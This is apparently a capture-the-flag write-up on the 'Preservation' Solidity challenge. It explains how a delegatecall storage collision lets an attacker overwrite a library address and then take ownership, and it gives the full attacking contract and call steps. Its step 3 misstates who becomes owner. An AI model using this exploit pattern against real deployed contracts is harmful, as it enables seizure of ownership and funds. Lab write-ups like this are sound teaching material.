## Objectives

1. Claim ownership of the contract.

## Vulnerabilities

### Delegatecall

`Delegatecall` Can be used to modify specify storage variables. In this case, we can change the address of a library
instance to our hack contract. From there, we can modify the owner by using a function with the same function signature
as in the library contract.

## Exploit

1. Write and deploy this hack contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract PreservationHack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    Preservation target;

    constructor(address _targetAddress){
        target = Preservation(_targetAddress);
    }

    function attack() public {
        target.setFirstTime(uint(uint160(address(this))));
    }

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
```

2. Call the `attack` function which will modify the first storage variable of the Preservation contract to the
   address of ths hack contract.

3. Call the `setFirstTime` function with any uint as input to modify the owner to the hack contract.

## Suggested mitigation

Using stateless libraries prevent this type of exploit.
